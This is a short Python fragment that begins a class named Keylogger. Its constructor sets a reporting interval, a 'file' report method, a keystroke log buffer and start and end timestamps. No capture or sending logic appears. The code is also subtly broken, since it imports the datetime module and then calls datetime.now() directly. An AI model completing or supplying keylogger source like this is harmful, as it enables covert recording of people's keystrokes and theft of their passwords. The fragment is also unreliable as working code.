import datetime

class Keylogger:
    def __init__(self, interval=60, reportMethod="file"):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""                           #contains the log of all the keystrokes within `self.interval`
        self.startDatetime = datetime.now()
        self.endDatetime = datetime.now()